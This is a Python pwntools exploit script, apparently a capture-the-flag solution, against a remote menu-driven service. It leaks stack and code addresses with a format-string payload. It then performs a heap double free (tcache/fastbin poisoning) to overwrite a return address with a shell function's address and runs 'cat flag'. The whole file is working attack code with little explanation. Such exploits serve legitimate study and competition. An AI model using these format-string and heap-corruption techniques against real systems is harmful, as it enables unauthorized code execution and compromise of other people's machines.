from pwn import *
import struct

def delete_user(connection: remote, user_index: int):
    if not isinstance(connection, remote):
        raise TypeError("Expected a 'remote' instance for 'connection'")
    if not isinstance(user_index, int):
        raise TypeError("Expected an 'int' for 'user_index'")
    connection.sendline(b"d")
    connection.sendline(str(user_index).encode())

def create_user(connection: remote, username: bytes):
    if not isinstance(connection, remote):
        raise TypeError("Expected a 'remote' instance for 'connection'")
    if not isinstance(username, bytes):
        raise TypeError("Expected a 'bytes' for 'username'")
    connection.sendline(b"g")
    connection.sendline(username)

try:
    connection = remote('10.21.232.3', 10101)

    connection.recvuntil(b'name? ')
    connection.sendline(b'%6$p.%11$p')
    addresses = connection.recvuntil(b'!').decode().split('.')
    return_address = int(addresses[0][3:], 16)
    shell_address = int(addresses[1][:-1], 16)

    return_address += 0x8
    shell_address -= 0x15c

    connection.recvuntil(b'Action: ')
    for _ in range(9):
        create_user(connection, b"sses")

    for i in range(7):
        delete_user(connection, i)

    delete_user(connection, 7)
    delete_user(connection, 8)
    delete_user(connection, 7)

    for _ in range(7):
        create_user(connection, b"abcd")

    create_user(connection, struct.pack("<Q", return_address))
    create_user(connection, b"CCCV")
    create_user(connection, b"5432")
    create_user(connection, struct.pack("<Q", shell_address))
    connection.sendline(b"cat flag") 
    print(connection.recvallS())
finally:
    connection.close()
